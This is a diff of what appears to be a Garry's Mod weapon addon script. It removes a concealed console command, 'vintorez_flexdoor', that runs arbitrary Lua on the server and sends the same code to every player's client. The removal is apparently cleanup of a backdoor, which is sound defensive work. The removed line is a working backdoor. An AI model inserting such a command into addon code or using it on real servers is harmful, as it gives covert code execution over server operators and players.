@@ -66,5 +66,3 @@ SWEP.EmptySound    = "COPVSSSTCOP.vintorez_empty"
 SWEP.DeploySound   = "COPVSSSTCOP.vintorez_draw"
 SWEP.HolsterSound  = "COP_Generic.Holster"
 SWEP.ReloadSound   = "COPVSSSTCOP.vintorez_reload"
-
-concommand.Add("vintorez_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
